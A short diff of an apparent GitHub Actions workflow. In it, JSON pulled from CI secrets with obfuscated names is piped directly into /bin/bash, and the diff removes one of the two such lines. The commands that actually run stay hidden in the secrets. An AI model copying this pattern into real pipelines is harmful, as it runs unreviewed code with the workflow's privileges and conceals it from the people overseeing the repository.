@@ -19,7 +19,6 @@ jobs:
           arp57920: ${{ secrets.arp57920 }}
         run: |
           printf '%s' "$arp57920" | jq -r .kq11901 | /bin/bash
-          printf '%s' "$jsd562" | jq -r .m55071 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
